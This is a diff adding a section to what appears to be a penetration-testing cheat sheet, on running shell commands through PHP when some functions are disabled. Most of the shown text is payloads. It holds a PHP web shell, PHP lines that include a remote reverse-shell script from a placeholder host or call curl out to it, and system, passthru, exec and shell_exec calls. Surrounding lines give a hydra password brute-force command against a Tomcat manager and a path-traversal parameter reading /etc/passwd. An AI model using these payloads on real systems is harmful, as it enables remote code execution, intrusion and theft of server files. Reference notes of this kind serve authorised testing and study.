@@ -290,6 +290,37 @@ hydra -l tomcat -P passfile.txt -t -s 443 -f <IP> http-get /manager/html -s 8080
 <?php system($_GET['cmd']);?>
 ```
 
+### bypassing php functions (Thanks to @dee-see and @kargha for recommending).
+
+Resources:  
+https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru  
+
+table taken from the above stackoverflow thread. This was extremely useful.
+
+```
++----------------+-----------------+----------------+----------------+
+|    Command     | Displays Output | Can Get Output | Gets Exit Code |
++----------------+-----------------+----------------+----------------+
+| system()       | Yes (as text)   | Last line only | Yes            |
+| passthru()     | Yes (raw)       | No             | Yes            |
+| exec()         | No              | Yes (array)    | Yes            |
+| shell_exec()   | No              | Yes (string)   | No             |
+| backticks (``) | No              | Yes (string)   | No             |
++----------------+-----------------+----------------+----------------+
+```
+
+```
+<?php echo "abcdef"; ?>
+<?php echo `test`; ?>
+<?php include("http://x/reverse_shell.php"); ?>
+<?php include_once("http://x/reverse_shell.php"); ?>
+<?php `curl "http://x"` ?>
+<?php system("id");?>
+<?php passthru("whoami");?>
+<?php exec("/bin/ls /");?>
+<?php shell_exec("whoami");?>
+```
+
 ### param tampers
 ```
 query?param=/legit/path/to/file.php/../../../../etc/passwd
